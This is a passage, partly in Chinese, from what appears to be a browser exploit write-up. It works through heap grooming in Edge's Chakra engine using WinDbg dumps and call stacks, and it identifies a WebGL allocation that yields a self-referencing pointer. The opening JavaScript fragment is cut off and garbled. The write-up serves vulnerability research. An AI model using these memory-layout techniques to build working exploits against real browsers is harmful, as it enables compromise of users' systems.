    //Read as unsigned dword
    function ud(sd) {
        return (sd  dqs 00000268`abdc0000
    00000268`abdc0000  00000000`00000000
    00000268`abdc0008  00000000`00000000
    00000268`abdc0010  00000073`8bfdb3e0
    00000268`abdc0018  00000000`000000d8
    00000268`abdc0020  00000268`abdc0159        // reference to buffer + 0x159
    00000268`abdc0028  00000000`00000000
    00000268`abdc0030  00000000`00000000
    00000268`abdc0038  00000000`00000000
    00000268`abdc0040  00000000`00000000
    00000268`abdc0048  00000000`00000000
    00000268`abdc0050  00000001`ffffffff
    00000268`abdc0058  00000001`00000000
    00000268`abdc0060  00000000`00000000
    00000268`abdc0068  00000000`00000000
    00000268`abdc0070  00000000`00000000
    00000268`abdc0078  00000000`00000000
虽然释放一些int数组为WebGL缓冲区腾出了空间，但我注意到它们并没有被立即释放，而是在线程空闲时调用VirtualFree，就像以下调用栈所建议的（注意所涉及到的方法名称，如Memory
:: IdleDecommitPageAllocator :: IdleDecommit，ThreadServiceWrapperBase ::
IdleCollect等）那样。这可以通过setTimeout让函数几秒钟后执行来克服。
    > bp kernelbase!VirtualFree "k 10; gc"
     # Child-SP          RetAddr           Call Site
    00 0000003b`db4fce58 00007ffd`f763d307 KERNELBASE!VirtualFree
    01 0000003b`db4fce60 00007ffd`f76398f8 chakra!Memory::PageAllocatorBase::ReleasePages+0x247
    02 0000003b`db4fcec0 00007ffd`f76392c4 chakra!Memory::LargeHeapBlock::ReleasePages+0x54
    03 0000003b`db4fcf40 00007ffd`f7639b54 chakra!PageStack::CreateChunk+0x1c4
    04 0000003b`db4fcfa0 00007ffd`f7639c62 chakra!Memory::LargeHeapBucket::SweepLargeHeapBlockList+0x68
    05 0000003b`db4fd010 00007ffd`f764253f chakra!Memory::LargeHeapBucket::Sweep+0x6e
    06 0000003b`db4fd050 00007ffd`f76426fc chakra!Memory::Recycler::SweepHeap+0xaf
    07 0000003b`db4fd0a0 00007ffd`f7641263 chakra!Memory::Recycler::Sweep+0x50
    08 0000003b`db4fd0e0 00007ffd`f7687f50 chakra!Memory::Recycler::FinishConcurrentCollect+0x313
    09 0000003b`db4fd180 00007ffd`f76415b1 chakra!ThreadContext::ExecuteRecyclerCollectionFunction+0xa0
    0a 0000003b`db4fd230 00007ffd`f76b82c8 chakra!Memory::Recycler::FinishConcurrentCollectWrapped+0x75
    0b 0000003b`db4fd2b0 00007ffd`f8105bab chakra!ThreadServiceWrapperBase::IdleCollect+0x70
    0c 0000003b`db4fd2f0 00007ffe`110b1c24 edgehtml!CTimerCallbackProvider::s_TimerProviderTimerWndProc+0x5b
    0d 0000003b`db4fd320 00007ffe`110b156c user32!UserCallWinProcCheckWow+0x274
    0e 0000003b`db4fd480 00007ffd`f5c7c781 user32!DispatchMessageWorker+0x1ac
    0f 0000003b`db4fd500 00007ffd`f5c7ec41 EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
     # Child-SP          RetAddr           Call Site
    00 0000003b`dc09f578 00007ffd`f763ec85 KERNELBASE!VirtualFree
    01 0000003b`dc09f580 00007ffd`f763d61d chakra!Memory::PageSegmentBase::DecommitFreePages+0xc5
    02 0000003b`dc09f5c0 00007ffd`f769c05d chakra!Memory::PageAllocatorBase::DecommitNow+0x1c1
    03 0000003b`dc09f610 00007ffd`f7640a09 chakra!Memory::IdleDecommitPageAllocator::IdleDecommit+0x89
    04 0000003b`dc09f640 00007ffd`f76cfb68 chakra!Memory::Recycler::ThreadProc+0xd5
    05 0000003b`dc09f6e0 00007ffe`1044b2ba chakra!Memory::Recycler::StaticThreadProc+0x18
    06 0000003b`dc09f730 00007ffe`1044b38c msvcrt!beginthreadex+0x12a
    07 0000003b`dc09f760 00007ffe`12ad8364 msvcrt!endthreadex+0xac
    08 0000003b`dc09f790 00007ffe`12d85e91 KERNEL32!BaseThreadInitThunk+0x14
    09 0000003b`dc09f7c0 00000000`00000000 ntdll!RtlUserThreadStart+0x21
经过与WebGL相关的几次测试后，我发现能够稳定地触发WebGL相关的分配来回收释放的int数组留下的内存空隙的调用堆栈如下所示。奇怪的是，这个内存分配不是通过VirtualAlloc完成的，而是通过HeapAlloc，但是它位于为此目的留下的一个内存空隙上。
    [...]
    Trying to alloc 0x1e84c0 bytes
    ntdll!RtlAllocateHeap:
    00007ffd`99637370 817910eeddeedd  cmp     dword ptr [rcx+10h],0DDEEDDEEh ds:000001f8`ae0c0010=ddeeddee
    0:010> gu
    d3d10warp!UMResource::Init+0x481:
    00007ffd`92937601 488bc8          mov     rcx,rax
    0:010> r
    rax=00000200c2cc0000 rbx=00000201c2d5d700 rcx=098674b229090000
    rdx=00000000001e84c0 rsi=00000000001e8480 rdi=00000200b05e9390
    rip=00007ffd92937601 rsp=00000065724f94f0 rbp=0000000000000000
     r8=00000200c2cc0000  r9=00000201c3b02080 r10=000001f8ae0c0038
    r11=00000065724f9200 r12=0000000000000000 r13=00000200b0518968
    r14=0000000000000000 r15=0000000000000001
    0:010> k 20
     # Child-SP          RetAddr           Call Site
    00 00000065`724f94f0 00007ffd`929352d9 d3d10warp!UMResource::Init+0x481
    01 00000065`724f9560 00007ffd`92ea1ce1 d3d10warp!UMDevice::CreateResource+0x1c9
    02 00000065`724f9600 00007ffd`92e7732c d3d11!CResource::CLS::FinalConstruct+0x2a1
    03 00000065`724f9970 00007ffd`92e7055a d3d11!CDevice::CreateLayeredChild+0x312c
    04 00000065`724fb1a0 00007ffd`92e97913 d3d11!NDXGI::CDeviceChild::FinalConstruct+0x5a
    05 00000065`724fb240 00007ffd`92e999e8 d3d11!NDXGI::CResource::FinalConstruct+0x3b
    06 00000065`724fb290 00007ffd`92ea35bc d3d11!NDXGI::CDevice::CreateLayeredChild+0x1c8
    07 00000065`724fb410 00007ffd`92e83602 d3d11!NOutermost::CDevice::CreateLayeredChild+0x25c
    08 00000065`724fb600 00007ffd`92e7e94f d3d11!CDevice::CreateTexture2D_Worker+0x412
    09 00000065`724fba20 00007ffd`7fad98db d3d11!CDevice::CreateTexture2D+0xbf
    0a 00000065`724fbac0 00007ffd`7fb17c66 edgehtml!CDXHelper::CreateWebGLColorTexturesFromDesc+0x6f
    0b 00000065`724fbb50 00007ffd`7fb18593 edgehtml!CDXRenderBuffer::InitializeAsColorBuffer+0xe6
    0c 00000065`724fbc10 00007ffd`7fb198aa edgehtml!CDXRenderBuffer::SetStorageAndSize+0x73
    0d 00000065`724fbc40 00007ffd`7fae6e0b edgehtml!CDXFrameBuffer::Initialize+0xc2
    0e 00000065`724fbcb0 00007ffd`7faecff0 edgehtml!RefCounted::Create2+0xa3
    0f 00000065`724fbd00 00007ffd`7faece6b edgehtml!CDXRenderTarget3D::InitializeDefaultFrameBuffer+0x60
    10 00000065`724fbd50 00007ffd`7faecc87 edgehtml!CDXRenderTarget3D::InitializeContextState+0x11b
    11 00000065`724fbdb0 00007ffd`7fad015b edgehtml!CDXRenderTarget3D::Initialize+0x137
    12 00000065`724fbde0 00007ffd`7fad48ca edgehtml!RefCounted::Create2+0x7f
    13 00000065`724fbe30 00007ffd`7fcda10f edgehtml!CDXSystem::CreateRenderTarget3D+0x10a
    14 00000065`724fbeb0 00007ffd`7f1feca0 edgehtml!CWebGLRenderingContext::EnsureTarget+0x8f
    15 00000065`724fbf10 00007ffd`7fc9373c edgehtml!CCanvasContextBase::EnsureBitmapRenderTarget+0x80
    16 00000065`724fbf60 00007ffd`7f74f3fd edgehtml!CHTMLCanvasElement::EnsureWebGLContext+0xb8
    17 00000065`724fbfa0 00007ffd`7f27af74 edgehtml!`TextInput::TextInputLogging::Instance'::`2'::`dynamic atexit destructor for 'wrapper''+0xba6fd
    18 00000065`724fc000 00007ffd`7f675945 edgehtml!CFastDOM::CHTMLCanvasElement::Trampoline_getContext+0x5c
    19 00000065`724fc050 00007ffd`7eb3c35b edgehtml!CFastDOM::CHTMLCanvasElement::Profiler_getContext+0x25
    1a 00000065`724fc080 00007ffd`7ebc1393 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b
    1b 00000065`724fc160 00007ffd`7ea8d873 chakra!amd64_CallFunction+0x93
    1c 00000065`724fc1b0 00007ffd`7ea90419 chakra!Js::JavascriptFunction::CallFunction+0x83
    1d 00000065`724fc210 00007ffd`7ea94f4d chakra!Js::InterpreterStackFrame::OP_CallI > > >+0x99
    1e 00000065`724fc260 00007ffd`7ea94b07 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d
    1f 00000065`724fc2f0 00007ffd`7ea936c9 chakra!Js::InterpreterStackFrame::Process+0x1a7
调用堆栈中的edgehtml！CFastDOM :: CHTMLCanvasElement ::
Trampoline_getContext的存在揭示了这个代码路径是由我的WebGL初始化代码中的JavaScript行触发的：
    canvas.getContext("experimental-webgl");
在d3d10warp！UMResource :: Init这个堆分配之后的几个指令，分配的缓冲区的地址存储在缓冲区+
0x38处，这正是我们梦寐以求的那种自我引用：
    d3d10warp!UMResource::Init+0x479:
    00007ffd`929375f9 33d2            xor     edx,edx
    00007ffd`929375fb ff159f691e00    call    qword ptr [d3d10warp!_imp_HeapAlloc (00007ffd`92b1dfa0)]      //Allocates 0x1e84c0 bytes
    00007ffd`92937601 488bc8          mov     rcx,rax
    00007ffd`92937604 4885c0          test    rax,rax